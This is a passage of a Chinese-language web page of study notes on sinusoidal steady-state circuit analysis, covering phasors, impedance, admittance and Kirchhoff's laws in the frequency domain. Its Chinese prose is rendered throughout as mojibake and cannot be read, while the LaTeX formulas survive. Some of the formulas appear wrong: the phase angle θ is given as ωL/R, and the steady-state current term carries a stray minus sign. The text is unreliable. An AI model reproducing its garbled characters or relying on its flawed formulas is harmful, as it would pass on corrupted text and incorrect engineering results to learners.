è¡¨ç¤ºæ­£å¼¦ç”µå‹çš„æœ€å¤§å€¼. å³æŒ¯å¹….</p><p>å‘¨æœŸ $T$ (å•ä½ s) å’Œé¢‘ç‡ $f$ (å•ä½ Hz):<br>$$<br>\displaylines{f &#x3D; \frac{1}{T}}<br>$$</p><p>$\omega$ è¡¨ç¤ºæ­£å¼¦å‡½æ•°çš„è§’é¢‘ç‡:<br>$$<br>\displaylines{\omega &#x3D; 2 \pi f &#x3D; \frac{2 \pi}{T} (rad&#x2F;s)}<br>$$</p><p>(å¯ä»¥ç†è§£ä¸º, 1 ç§’å†…è½¬åŠ¨çš„æ€»è§’åº¦, $\omega t$ å°±æ˜¯ä¸€æ®µæ—¶é—´è½¬è¿‡çš„æ€»è§’åº¦, åç§°çš„ç”±æ¥å¯èƒ½æ˜¯, è§’åº¦ä¹˜ä»¥é¢‘ç‡, å› æ­¤å«è§’é¢‘ç‡)</p><p>$\phi$ è¡¨ç¤ºç›¸ä½è§’. (ç›¸ä½, å¯ä»¥ç†è§£ä¸ºç›¸å¯¹ä½ç½®) å…¶ä»£è¡¨ $t &#x3D; 0$ æ—¶, æ­£å¼¦å‡½æ•°çš„å€¼. å…¶å¯ä»¥ä½¿æ­£å¼¦å‡½æ•°æ²¿æ—¶é—´è½´å¹³ç§», ä½†ä¸ä¼šå½±å“ $V_m$ å’Œ $\omega$.</p><p><mark>å¦‚æœ $\phi$ ä¸ºæ­£, åˆ™æ­£å¼¦å‡½æ•°å·¦ç§»</mark> , å¦‚æœ $\phi$ ä¸ºè´Ÿ, åˆ™æ­£å¼¦å‡½æ•°å³ç§».</p><p><mark>å¼§åº¦ä¸åº¦çš„å…³ç³»</mark>:<br>$$<br>\displaylines{(åº¦æ•°) &#x3D; \frac{180^\circ}{\pi} (å¼§åº¦)}<br>$$</p><p>æ­£å¼¦ç”µå‹ (ç”µæµ) å‡½æ•°çš„ä¸€ä¸ªé‡è¦ç‰¹å¾, å…¶å‡æ–¹æ ¹ (ä¸€ä¸ªå‡½æ•°å¹³æ–¹çš„å¹³å‡å€¼å†å¼€æ–¹ç§°ä¸ºè¯¥å‡½æ•°çš„å‡æ–¹æ ¹), å¦‚ $v &#x3D; V_m \cos (\omega t + \phi)$, ä¸º:<br>$$<br>\displaylines{V_{rms} &#x3D; \sqrt{ \frac{1}{T} \int_{t_0}^{t_0 + T} V_m^2 \cos^2 (\omega t + \phi)dt} \newline~ \newline<br>&#x3D; \frac{V_m}{\sqrt{2}}<br>}<br>$$<br>(ç§¯çš„æ˜¯ä¸€ä¸ªå‘¨æœŸ)</p><p>å¯èƒ½éœ€è¦ç”¨åˆ°å€è§’å…¬å¼:</p><p><img src="/../img/double_angle_formula.png"></p><p>å¯ä»¥çœ‹å‡º <mark>æ­£å¼¦ç”µå‹çš„å‡æ–¹æ ¹ä»…ä»…å–å†³äº v çš„æœ€å¤§å¹…å€¼</mark> </p><h2 id="9-2-æ­£å¼¦å“åº”"><a href="#9-2-æ­£å¼¦å“åº”" class="headerlink" title="9.2 æ­£å¼¦å“åº”"></a>9.2 æ­£å¼¦å“åº”</h2><p>æ±‚è§£æ­£å¼¦å“åº”å®é™…ä¸Šå°±æ˜¯æ±‚è§£å“åº”çš„å¹…å€¼å’Œç›¸ä½è§’. (å½¢çŠ¶å’Œé¢‘ç‡å·²çŸ¥äº†, å½“ç„¶è¿˜æ˜¯å…ˆæ±‚ç”µæµæˆ–ç”µå‹çš„è¡¨è¾¾å¼)</p><p><img src="/../img/sine_response.png"></p><p>$v_s$ æ˜¯æ­£å¼¦ç”µå‹ $v_s &#x3D; V_m \cos (\omega t + \phi)$</p><p>åˆ©ç”¨åŸºå°”éœå¤«ç”µå‹å®šå¾‹:<br>$$<br>\displaylines{L \frac{di}{dt} + Ri &#x3D; V_s \cos (\omega t + \phi)}<br>$$</p><p>è§£å‡º:<br>$$<br>\displaylines{i &#x3D; \frac{-V_m}{\sqrt{R^2 + \omega^2 L^2}} \cos (\phi - \theta) e^{-(R&#x2F;L)t} + \frac{-V_m}{\sqrt{R^2 + \omega^2 L^2}} \cos (\omega t + \phi - \theta)<br>}<br>$$<br>å…¶ä¸­ $\theta &#x3D; \omega \frac{L}{R}$.</p><p>$\frac{-V_m}{\sqrt{R^2 + \omega^2 L^2}} \cos (\phi - \theta) e^{-(R&#x2F;L)t}$ è¢«ç§°ä¸º <mark>ç”µæµçš„æš‚æ€åˆ†é‡</mark> , å› ä¸ºéšç€æ—¶é—´çš„æ¨ç§», å®ƒå°†è¶‹äºæ— ç©·å°.</p><p>$\frac{-V_m}{\sqrt{R^2 + \omega^2 L^2}} \cos (\omega t + \phi - \theta)$ è¢«ç§°ä¸º <mark>ç¨³æ€åˆ†é‡</mark> , å› ä¸ºåªè¦å¼€å…³ä¿æŒé—­åˆçŠ¶æ€ä¸”ä¿¡å·æºä¸ºæ­£å¼¦ç”µå‹, è¿™ä¸ªåˆ†é‡å°±ä¸€ç›´å­˜åœ¨.</p><p>æš‚æ€åˆ†é‡å“åº”å’Œç¨³æ€åˆ†é‡å“åº”åˆç§°ä¸º<mark>å…¨å“åº”</mark>.</p><p>å‡ æ¡å…³äºç¨³æ€å“åº”çš„æ€§è´¨:</p><p><img src="/../img/several_charac_about_stable_response.png"></p><h2 id="9-3-ç›¸é‡"><a href="#9-3-ç›¸é‡" class="headerlink" title="9.3 ç›¸é‡"></a>9.3 ç›¸é‡</h2><p><mark>æ­£å¼¦å‡½æ•°çš„ç›¸é‡æ˜¯</mark> å«å¹…å€¼ ($V_m$) å’Œç›¸ä½è§’ ($\phi$) çš„å¤æ•°. (æ­£å› ä¸ºæ±‚è§£æ­£å¼¦å‡½æ•°çš„å“åº”æ˜¯æ±‚å…¶å¹…å€¼å’Œç›¸ä½è§’, æ‰éœ€è¦è¿™ä¸ªé‡æ¥ç®€åŒ–è®¡ç®—)</p><p><mark>æ¬§æ‹‰å®šç†</mark> , æè¿°äº†æŒ‡æ•°å‡½æ•°ä¸ä¸‰è§’å‡½æ•°çš„å…³ç³».</p><p>$$<br>\displaylines{e^{\pm j \theta} &#x3D; \cos \theta \pm j \sin \theta}<br>$$</p><p>â„œ è¡¨ç¤ºä¸Šè¿°çš„å®æ•°éƒ¨åˆ†, å³ $\cos \theta &#x3D; â„œ \{e^{j \theta}\}$</p><p><img src="/../img/representation_by_two_symbles.png"></p><p>å› æ­¤æœ‰:<br>$$<br>\displaylines{v &#x3D; V_m \cos (\omega t + \phi) &#x3D; V_m â„œ \{e^{j(\omega t + \phi)}\} &#x3D; V_m â„œ \{e ^{j \omega t} e^{j \phi}\} \newline~ \newline<br>v &#x3D; â„œ \{V_m e^{j\phi} e^{j\omega t}\}<br>}<br>$$</p><p>è¿™é‡Œ, $V_m e^{j\phi}$ å°±æ˜¯ä¸€ä¸ªåŒ…å«ç»™å®šæ­£å¼¦å‡½æ•°çš„å¹…å€¼ä»¥åŠç›¸ä½è§’çš„å¤æ•°, å³ç»™å®šæ­£å¼¦å‡½æ•°çš„<mark>ç›¸é‡</mark>.</p><p>æœ‰:<br>$$<br>\displaylines{V &#x3D; V_m e^{j\phi} &#x3D; P\{V_m \cos (\omega t + \phi)\}}<br>$$<br>å…¶ä¸­, $P\{V_m \cos (\omega t + \phi)\}$ è¯»ä¸º â€œ$V_m \cos(\omega t + \phi)$ çš„ç›¸é‡å˜æ¢â€, è¿™é‡Œä¹Ÿæ˜¯ç›¸é‡çš„æåæ ‡å½¢å¼.</p><p>é€šè¿‡ç›¸é‡å˜æ¢å¯ä»¥å°† <mark>æ—¶åŸŸ</mark>(time domain, æè¿°æ•°å­¦å‡½æ•°æˆ–ç‰©ç†ä¿¡å·å¯¹æ—¶é—´çš„å…³ç³») ä¸Šçš„æ­£å¼¦å‡½æ•°å˜æ¢åˆ° <mark>å¤æ•°åŸŸ</mark> , æœ‰æ—¶ä¹Ÿç§°ä¸º <mark>é¢‘ç‡åŸŸ</mark>(frequency domain, ç ”ç©¶æ•°å­¦å‡½æ•°æˆ–ç‰©ç†ä¿¡å·å’Œé¢‘ç‡ç›¸å…³è€Œä¸æ—¶é—´æ— å…³) .</p><p><mark>ç›¸é‡çš„ä¸‰è§’å‡½æ•°å½¢å¼</mark> :<br>$$<br>\displaylines{ V &#x3D; V_m e^{j\phi} \newline~ \newline<br>åˆ©ç”¨æ¬§æ‹‰å®šç†åˆ†è§£\ e^{j\phi},\ \ V &#x3D; V_m \cos \phi + jV_m sin \phi}<br>$$</p><p><mark>æŒ‡æ•°å‡½æ•° $e^{j\phi}$</mark> çš„ç®€åŒ–ç¬¦å·:<br>$1\ \angle^{\phi^\circ} &#x3D; 1\ e^{j\phi}$</p><p>(ç”¨è¿™ä¸ªç¬¦å·ä¹Ÿå¾ˆæ˜¾ç„¶, å› ä¸ºè¿™é‡Œæˆ‘ä»¬åªå…³å¿ƒç›¸ä½è§’)</p><h3 id="9-3-1-åç›¸é‡å˜æ¢"><a href="#9-3-1-åç›¸é‡å˜æ¢" class="headerlink" title="9.3.1 åç›¸é‡å˜æ¢"></a>9.3.1 åç›¸é‡å˜æ¢</h3><p><mark>åç›¸é‡å˜æ¢</mark> æŒ‡, å·²çŸ¥ç›¸é‡å½¢å¼æ¨å¯¼å‡ºæ­£å¼¦å‡½æ•°.</p><p>ç”±äºç›¸é‡ä»…ä»…åŒ…å«å¹…å€¼å’Œç›¸ä½ä¿¡æ¯, æ‰€ä»¥ä¸èƒ½ä»ç›¸é‡ä¸­æ¨å¯¼å‡º $\omega$ çš„å€¼.</p><p>æè¿°å…¬å¼:<br>$$<br>\displaylines{P^{-1} \{V_m e^{j\phi}\} &#x3D; â„œ \{V_m e^{j\phi} e^{j\omega t}\}}<br>$$</p><p>$P^{-1} \{V_m e^{j\phi}\}$ è¯»ä½œ â€œ $V_m e^{j \phi}$ çš„åç›¸é‡å˜æ¢â€ </p><p><mark>æ³¨æ„</mark>, ç›¸é‡å˜æ¢å’Œåç›¸é‡å˜æ¢å…è®¸å‡½æ•°åœ¨æ—¶åŸŸå’Œé¢‘åŸŸä¹‹é—´è½¬æ¢, å› æ­¤, å¯¹äºç”µè·¯çš„è§£, å³å¯ä»¥è¡¨ç¤ºä¸ºæ—¶åŸŸçš„å½¢å¼, ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸ºé¢‘åŸŸçš„å½¢å¼.</p><p>ç›¸é‡æ³•å¯ç”¨æ¥è®¡ç®—æ­£å¼¦å‡½æ•°çš„å’Œ, è§ä¹¦.</p><p>åé¢æœ‰æ¨å¯¼, å¤§æ¦‚å°±æ˜¯, å¦‚æœ:<br>$$<br>\displaylines{v &#x3D; v_1 + v_2 + â€¦ + v_n}<br>$$</p><p>åˆ™æœ‰:<br>$$<br>\displaylines{V &#x3D; V_1 + V_2 + â€¦ + V_n}<br>$$</p><p>ç¤ºä¾‹:</p><blockquote><p>$y_1 &#x3D; 20 \cos (\omega t - 30^\circ),\ y_2 &#x3D; 40 \cos (\omega t + 60^\circ)$, æ±‚ $y &#x3D; y_1 + y_2$ çš„æ­£å¼¦å‡½æ•°è¡¨è¾¾å¼ (åˆ©ç”¨ç›¸é‡æ³•æ±‚è§£)</p></blockquote><p>$$<br>\displaylines{\because y &#x3D; y_1 + y_2 \newline~ \newline<br>Y &#x3D; Y_1 + Y_2 \newline~ \newline<br>&#x3D; 20 \angle^{-30^\circ} + 40 \angle^{60^\circ} \newline~ \newline<br>&#x3D; (17.32 - j 10) + (20 + j 34.64) \newline~ \newline<br>&#x3D; 37.32 + j 24.64 \newline~ \newline<br>&#x3D; 44.72 \angle^{33.43^\circ} \newline~ \newline<br>\therefore y &#x3D; P^{-1} \{44.72 e^{j33.43}\} &#x3D; â„œ \{44.72 e^{j33.43} e^{j\omega t}\} &#x3D; 44.72 \cos(\omega t + 33.43^\circ)<br>}<br>$$</p><h2 id="9-4-é¢‘åŸŸä¸‹çš„æ— æºç”µè·¯å…ƒä»¶"><a href="#9-4-é¢‘åŸŸä¸‹çš„æ— æºç”µè·¯å…ƒä»¶" class="headerlink" title="9.4 é¢‘åŸŸä¸‹çš„æ— æºç”µè·¯å…ƒä»¶"></a>9.4 é¢‘åŸŸä¸‹çš„æ— æºç”µè·¯å…ƒä»¶</h2><p>åº”ç”¨ç›¸é‡å˜æ¢æ³•éœ€è¦ä¸¤ä¸ªæ­¥éª¤:</p><ol><li>å»ºç«‹ç”µæµç›¸é‡ä¸æ— æºç”µè·¯å…ƒä»¶ä¸¤ç«¯çš„ç”µå‹ç›¸é‡ä¹‹é—´çš„å…³ç³»å¼</li><li>å»ºç«‹ç›¸é‡åŸŸä¸‹çš„åŸºå°”éœå¤«å®šå¾‹</li></ol><h3 id="9-4-1-ç”µé˜»çš„ä¼å®‰ç‰¹æ€§"><a href="#9-4-1-ç”µé˜»çš„ä¼å®‰ç‰¹æ€§" class="headerlink" title="9.4.1 ç”µé˜»çš„ä¼å®‰ç‰¹æ€§"></a>9.4.1 ç”µé˜»çš„ä¼å®‰ç‰¹æ€§</h3><p>$$<br>\displaylines{i &#x3D; I_m \cos (\omega t + \theta_i) \newline~ \newline<br>v &#x3D; R[I_m \cos (\omega t + \theta_i)] &#x3D; R I_m [\cos (\omega t + \theta_i)] \newline~ \newline<br>V &#x3D; R I_m e^{j \theta_i} &#x3D; R I_m \angle^{\theta_i}, \ I &#x3D; I_m \angle^{\theta_i} \newline~ \newline<br>V &#x3D; RI<br>}<br>$$<br>å³, ç”µé˜»ä¸¤ç«¯çš„ç”µå‹ç›¸é‡ç­‰äºç”µé˜»ä¹˜ä»¥ç”µæµç›¸é‡.</p><p><mark>ä¿¡å·åŒç›¸</mark> , æŒ‡:</p><p><img src="/../img/same_phase_of_two_signal.png"></p><p>å³åŒæ—¶åˆ°è¾¾æ³¢å³°æ³¢è°·ä¹‹ç±»çš„å¯¹åº”å€¼.</p><p><img src="/../img/resistance_in_frequency_domain.png"></p><p>ç”µé˜»ä¸¤ç«¯çš„ç”µæµå’Œç”µå‹ä¹‹é—´æ²¡æœ‰ç›¸ä½ç§»åŠ¨ (è¿™é‡Œæ˜¯å¦æœ‰ç›¸ä½ç§»åŠ¨çœ‹ä¸¤è€…çš„ $\angle^{\theta}$ ä¹‹é—´æœ‰æ²¡æœ‰å·®å€¼)</p><h3 id="9-4-2-ç”µæ„Ÿçš„ä¼å®‰ç‰¹æ€§"><a href="#9-4-2-ç”µæ„Ÿçš„ä¼å®‰ç‰¹æ€§" class="headerlink" title="9.4.2 ç”µæ„Ÿçš„ä¼å®‰ç‰¹æ€§"></a>9.4.2 ç”µæ„Ÿçš„ä¼å®‰ç‰¹æ€§</h3><p>å³, ç”µæ„Ÿçš„ç”µæµç›¸é‡ä¸å®ƒä¸¤ç«¯çš„ç”µå‹ç›¸é‡ä¹‹é—´çš„å…³ç³»å¼.</p><p>$$<br>\displaylines{i &#x3D; I_m \cos (\omega t + \theta_i) \newline~ \newline<br>v &#x3D; L \frac{di}{dt} &#x3D; - \omega L I_m \sin (\omega t + \theta_i) \newline~ \newline<br>&#x3D; L \frac{di}{dt} &#x3D; - \omega L I_m \cos (\omega t + \theta_i - 90^\circ) \newline~ \newline<br>V &#x3D; -\omega L I_m e^{j(\theta_i - 90^\circ)} \newline~ \newline<br>&#x3D; -\omega L I_m e^{j \theta_i}e^{-j 90^\circ},\ \ e^{-j 90^\circ} &#x3D; \cos90^\circ - j\sin90^\circ &#x3D; -j \newline~ \newline<br>&#x3D; j \omega L I_m e^{j\theta} \newline~ \newline<br>&#x3D; j \omega L I<br>}<br>$$</p><p>(ä¸»è¦éœ€è¦è®°ä½ç»“è®º, å³ç”µæ„Ÿçš„ç”µå‹ç›¸é‡å’Œç”µæµç›¸é‡çš„å…³ç³»)</p><p><img src="/../img/inductance_in_frequency_domain.png"></p><p>ç”µæ„Ÿä¸¤ç«¯çš„ç”µå‹ç›¸é‡ä¸ç”µæµç›¸é‡ä¹‹é—´çš„å…³ç³»åŒæ ·é€‚ç”¨äº<mark>äº’æ„Ÿçº¿åœˆ</mark>.</p><p>ç”±äº:<br>$$<br>\displaylines{V &#x3D; j \omega L I \newline~ \newline<br>&#x3D; (\omega L \angle^{90^\circ)}I_m \angle^{\theta_i} &#x3D; \omega L I_m \angle^{(\theta_i + 90)^\circ}<br>}<br>$$</p><p>å› æ­¤è¿™é‡Œç”µæµæ»åç”µå‹ $90^\circ$<br>(å…¶å®ä¹Ÿå¾ˆå®¹æ˜“ç†è§£, åœ¨ç”µæ„Ÿä¸­, ç”±äºæ¥æ¬¡å®šç†, ç”µæµæ˜¯æŒç»­å˜å¤§çš„, ç¡®å®æ»åäºç”µå‹)</p><h3 id="9-4-3-ç”µå®¹çš„ä¼å®‰ç‰¹æ€§"><a href="#9-4-3-ç”µå®¹çš„ä¼å®‰ç‰¹æ€§" class="headerlink" title="9.4.3 ç”µå®¹çš„ä¼å®‰ç‰¹æ€§"></a>9.4.3 ç”µå®¹çš„ä¼å®‰ç‰¹æ€§</h3><p>æ¨å‡ºç”µå®¹ä¸¤ç«¯çš„ç”µå‹ç›¸é‡ä¸ç”µæµç›¸é‡ä¹‹é—´çš„å…³ç³»å¼:</p><p>$$<br>\displaylines{i &#x3D; C \frac{dv}{dt} \newline~ \newline<br>v &#x3D; V_m \cos (\omega t + \theta_v) \newline~ \newline<br>I &#x3D; j \omega C V \newline~ \newline<br>V &#x3D; \frac{1}{j \omega C} I}<br>$$</p><p><img src="/../img/capa_in_frequency_domain.png"></p><p>ç”±äº:<br>$$<br>\displaylines{V &#x3D; \frac{1}{\omega C} \angle^{-90^\circ} I_m \angle^{\theta^\circ_i} &#x3D; \frac{I_m}{\omega C} \angle^{(\theta_i - 90)^\circ}<br>}<br>$$</p><p>è¿™é‡Œæœ‰ç”µæµè¶…å‰ç”µå‹ $90^\circ$<br>(ç»“åˆè€…ç”µæ„Ÿè®°å¿†)</p><h3 id="9-4-4-é˜»æŠ—å’Œç”µæŠ—"><a href="#9-4-4-é˜»æŠ—å’Œç”µæŠ—" class="headerlink" title="9.4.4 é˜»æŠ—å’Œç”µæŠ—"></a>9.4.4 é˜»æŠ—å’Œç”µæŠ—</h3><p>æ— æºç”µè·¯å…ƒä»¶çš„ç”µå‹ç›¸é‡ä¸ç”µæµç›¸é‡ä¹‹é—´çš„å…³ç³»å¼çš„ç»Ÿä¸€å½¢å¼:<br>$$<br>\displaylines{V &#x3D; ZI}<br>$$</p><p>$Z$ è¡¨ç¤ºç”µè·¯å…ƒä»¶çš„<mark>é˜»æŠ—</mark> (å•ä½ä¸ºæ¬§å§†, é˜»æŠ—ä¸ºå¤æ•°, ä½†ä¸æ˜¯ç›¸é‡), å…¶å€¼ç­‰äºç”µè·¯å…ƒä»¶çš„ç”µå‹ç›¸é‡ä¸ç”µæµç›¸é‡ä¹‹æ¯”.</p><p>ç”±æ­¤å¯ä»¥æ¨å¯¼å‡º:</p><ul><li>ç”µé˜»é˜»æŠ—: $R$</li><li>ç”µæ„Ÿé˜»æŠ—: $j \omega L$</li><li>ç”µå®¹é˜»æŠ—: $\frac{1}{j \omega C}$</li></ul><h2 id="9-5-é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«å®šå¾‹"><a href="#9-5-é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«å®šå¾‹" class="headerlink" title="9.5 é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«å®šå¾‹"></a>9.5 é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«å®šå¾‹</h2><h3 id="9-5-1-é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«å®šå¾‹ç”µå‹å®šå¾‹"><a href="#9-5-1-é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«å®šå¾‹ç”µå‹å®šå¾‹" class="headerlink" title="9.5.1 é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«å®šå¾‹ç”µå‹å®šå¾‹"></a>9.5.1 é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«å®šå¾‹ç”µå‹å®šå¾‹</h3><p>å‡è®¾ $v_1$~$v_n$ ä¸ºä¸€é—­åˆå›è·¯ä¸Šçš„ç”µå‹, ç”±åŸºå°”éœå¤«å®šå¾‹å¾—:</p><p>$$<br>\displaylines{v_1 + v_2 + â€¦ + v_n &#x3D; 0}<br>$$</p><p>æ­£å¼¦å½¢å¼:<br>$$<br>\displaylines{V_{m_1}\cos (\omega t + \theta_1) + V_{m_2}\cos (\omega t + \theta_2) + â€¦ + V_{m_n}\cos (\omega t + \theta_n) &#x3D; 0}<br>$$</p><p>æ¬§æ‹‰å®šç†:<br>$$<br>\displaylines{â„œ \{V_{m_1} e^{j \theta_1} e^{j \omega t}\} + â„œ \{V_{m_2} e^{j \theta_2} e^{j \omega t}\} + â€¦ + â„œ \{V_{m_n} e^{j \theta_n} e^{j \omega t}\}}<br>$$</p><p>å¾—:</p><p>$$<br>\displaylines{â„œ \{V_{m_1} e^{j \theta_1} e^{j \omega t} + V_{m_2} e^{j \theta_2} e^{j \omega t} + â€¦ + V_{m_n} e^{j \theta_n} e^{j \omega t}\}}<br>$$</p><p>æå– $e^{j \omega t}$:<br>$$<br>\displaylines{â„œ \{(V_{m_1} e^{j \theta_1} + V_{m_2} e^{j \theta_2} + â€¦ + V_{m_n} e^{j \theta_n})e^{j\omega t}\} &#x3D; 0}<br>$$</p><p>å³:<br>$$<br>\displaylines{â„œ \{(V_1 + V_2 + â€¦ + V_n) e^{j \omega t}\} &#x3D; 0}<br>$$</p><p>ç”±äº $e^{j \omega t} \ne 0$, æ‰€ä»¥:<br>$$<br>\displaylines{V_1 + V_2 + â€¦ + V_n &#x3D; 0}<br>$$</p><p>è¿™å°±æ˜¯é¢‘åŸŸä¸‹çš„ç­‰æ•ˆå…¬å¼.</p><h3 id="9-5-2-é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«ç”µæµå®šå¾‹"><a href="#9-5-2-é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«ç”µæµå®šå¾‹" class="headerlink" title="9.5.2 é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«ç”µæµå®šå¾‹"></a>9.5.2 é¢‘åŸŸä¸‹çš„åŸºå°”éœå¤«ç”µæµå®šå¾‹</h3><p>ç±»ä¼¼çš„æ¨å¯¼æ–¹æ³•:<br>$$<br>\displaylines{i_1 + i_2 + â€¦ + i_n &#x3D; 0 \newline~ \newline<br>I_1 + I_2 + â€¦ + I_n &#x3D; 0}<br>$$</p><p>ç”µè·¯çš„ç›¸é‡åˆ†ææ³•åŒ…æ‹¬ä¸¤ä¸ªåŸºæœ¬ä»»åŠ¡:</p><ol><li>å¿…é¡»å»ºç«‹ç”µè·¯çš„é¢‘åŸŸæ¨¡å‹</li><li>å¿…é¡»èƒ½å¤Ÿç†Ÿç»ƒè¿›è¡Œå¤æ•°æˆ–è€…ä»£æ•°è®¡ç®—</li></ol><h2 id="9-6-ä¸²è”-å¹¶è”å’Œä¸‰è§’å½¢-æ˜Ÿå½¢å˜æ¢"><a href="#9-6-ä¸²è”-å¹¶è”å’Œä¸‰è§’å½¢-æ˜Ÿå½¢å˜æ¢" class="headerlink" title="9.6 ä¸²è”, å¹¶è”å’Œä¸‰è§’å½¢-æ˜Ÿå½¢å˜æ¢"></a>9.6 ä¸²è”, å¹¶è”å’Œä¸‰è§’å½¢-æ˜Ÿå½¢å˜æ¢</h2><h3 id="9-6-1-å¹¶è”é˜»æŠ—å’Œä¸²è”é˜»æŠ—çš„åˆå¹¶"><a href="#9-6-1-å¹¶è”é˜»æŠ—å’Œä¸²è”é˜»æŠ—çš„åˆå¹¶" class="headerlink" title="9.6.1 å¹¶è”é˜»æŠ—å’Œä¸²è”é˜»æŠ—çš„åˆå¹¶"></a>9.6.1 å¹¶è”é˜»æŠ—å’Œä¸²è”é˜»æŠ—çš„åˆå¹¶</h3><p>å°† <mark>å„é˜»æŠ—ç›¸åŠ </mark> å¯ä»¥å°† <mark>ä¸²è”é˜»æŠ—</mark> ç­‰æ•ˆä¸ºä¸€ä¸ªé˜»æŠ—.</p><p><img src="/../img/seri_impedance.png"></p><blockquote><p>æ¨å¯¼:</p></blockquote><p>ä¸²è”é˜»æŠ—éƒ½å…·æœ‰ç›¸åŒçš„ç”µæµç›¸é‡:<br>$$<br>\displaylines{V_{ab} &#x3D; Z_1 I + Z_2 I + â€¦ + Z_n I &#x3D; (Z_1 + Z_2 + â€¦ + Z_n)I \newline~ \newline<br>Z_{ab} &#x3D; \frac{V_{ab}}{I} &#x3D; Z_1 + Z_2 + â€¦ + Z_n<br>}<br>$$</p><p><mark>æ³¨æ„è¿™é‡Œçš„è®¡ç®—</mark> :<br>$$<br>\displaylines{I &#x3D; \frac{750 \angle^{30^\circ}}{150 \angle^{53.13^\circ}} &#x3D; 5 \angle^{-23.13^\circ}<br>}<br>$$</p><p>è¿™é‡Œä¸ç”¨å±•å¼€æ¥ç®—, èƒ½ç›´æ¥ç›¸å‡çš„åŸå› ä¸º, å…¶å¯ä»¥åŒ–ä¸º $\frac{e^{j30^\circ}}{e^{j53.13^\circ}}$</p><p>è™½ç„¶é˜»æŠ—ä¸æ˜¯ç›¸é‡, ä½†ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸ºå¦‚ $\left\vert Z \right\vert \angle^{\theta^\circ}$ çš„å½¢å¼.</p><p><mark>å¹¶è”é˜»æŠ—</mark> å¯ä»¥é€šè¿‡ä¸‹é¢çš„å…³ç³»å¼ç­‰æ•ˆä¸ºä¸€ä¸ªé˜»æŠ—:<br>$$<br>\displaylines{ \frac{1}{Z_{ab}} &#x3D; \frac{1}{Z_1} + \frac{1}{Z_2} + â€¦ + \frac{1}{Z_n}}<br>$$</p><p><img src="/../img/para_impendance.png"></p><blockquote><p>æ¨å¯¼</p></blockquote><p>ç”±äºå„é˜»æŠ—å…·æœ‰ç›¸åŒçš„ç«¯ç”µå‹:<br>$$<br>\displaylines{I &#x3D; I_1 + I_2 + â€¦ + I_n \newline~ \newline<br>\frac{V}{Z_{ab}} &#x3D; \frac{V}{Z_1} + \frac{V}{Z_2} + â€¦ + \frac{V}{Z_n}<br>$$</p><p>ä¸¤ä¸ªé˜»æŠ—å¹¶è”çš„æƒ…å†µ:<br>$$<br>\displaylines{Z_{ab} &#x3D; \frac{Z_1 Z_2}{Z_1 + Z_2}}<br>$$</p><p>å°†:<br>$$<br>\displaylines{ \frac{1}{Z_{ab}} &#x3D; \frac{1}{Z_1} + \frac{1}{Z_2} + â€¦ + \frac{1}{Z_n}}<br>$$</p><p>å†™æˆ <mark>å¯¼çº³çš„å½¢å¼</mark>, å¯¼çº³å®šä¹‰ä¸ºé˜»æŠ—çš„å€’æ•°, è®°ä¸º $Y$, å› æ­¤æœ‰:<br>$$<br>\displaylines{Y &#x3D; \frac{1}{Z} &#x3D; G + jB (S)}<br>$$<br>è¿™é‡Œ, å¯¼çº³æ˜¯ä¸€ä¸ªå¤æ•°, å®éƒ¨ $G$ ä¸ºç”µå¯¼, è™šéƒ¨ $B$ ç§°ä¸ºç”µçº³, å•ä½å‡ä¸ºè¥¿é—¨å­ (S).<br>$$<br>\displaylines{Y_{ab} &#x3D; Y_1 + Y_2 + â€¦ + Y_n}<br>$$</p><p>(æå–ä½äºåˆ†æ¯çš„ $j$ , å¦‚ $\frac{1}{j \omega c} &#x3D; -j \frac{1}{\omega c}$, è¿™é‡Œå°±æ˜¯åˆ†å­åˆ†æ¯åŒæ—¶ä¹˜ä»¥ $j$, ç„¶å $j^2 &#x3D; -1$, å› æ­¤æœ‰ä¸ªè´Ÿå·)</p><p><mark>å¯¼çº³åˆ°é˜»æŠ—çš„è½¬æ¢</mark> :<br>$$<br>\displaylines{Y &#x3D; 0.2 \angle^{36.87^\circ} \newline~ \newline<br>Z &#x3D; \frac{1}{Y} &#x3D; 5 \angle^{-36.87^\circ}}<br>$$<br>(è§’åº¦ç›´æ¥åŠ è´Ÿå·)</p><p><mark>æ³¨æ„</mark> , ç¨³æ€å“åº”çš„ç”µå‹å’Œç”µæµçš„é¢‘ç‡ç›¸åŒ.</p><h3 id="9-6-2-ä¸‰è§’å½¢-æ˜Ÿå½¢å˜æ¢"><a href="#9-6-2-ä¸‰è§’å½¢-æ˜Ÿå½¢å˜æ¢" class="headerlink" title="9.6.2 ä¸‰è§’å½¢-æ˜Ÿå½¢å˜æ¢"></a>9.6.2 ä¸‰è§’å½¢-æ˜Ÿå½¢å˜æ¢</h3><p>æ™®é€šç”µé˜»ç”µè·¯ä¸­çš„ $\Delta - Y$ å˜æ¢ä»é€‚ç”¨äºé˜»æŠ—ç”µè·¯.</p><p>å…·ä½“è§ä¹¦.</p><h2 id="9-7-ç”µæºå˜æ¢ä»¥åŠæˆ´ç»´å—-è¯ºé¡¿ç­‰æ•ˆç”µè·¯"><a href="#9-7-ç”µæºå˜æ¢ä»¥åŠæˆ´ç»´å—-è¯ºé¡¿ç­‰æ•ˆç”µè·¯" class="headerlink" title="9.7 ç”µæºå˜æ¢ä»¥åŠæˆ´ç»´å—-è¯ºé¡¿ç­‰æ•ˆç”µè·¯"></a>9.7 ç”µæºå˜æ¢ä»¥åŠæˆ´ç»´å—-è¯ºé¡¿ç­‰æ•ˆç”µè·¯</h2><p>æ™®é€šç”µè·¯ä¸­çš„ç”µæºå˜æ¢å’Œæˆ´ç»´å—-è¯ºé¡¿ç­‰æ•ˆç”µè·¯çš„åˆ†ææ–¹æ³•ä»ç„¶é€‚ç”¨äºé¢‘åŸŸä¸‹çš„ç”µè·¯.<br>(å”¯ä¸€çš„åŒºåˆ«åœ¨äºç”¨é˜»æŠ— (Z) ä»£æ›¿äº†ç”µé˜» (R))</p><h2 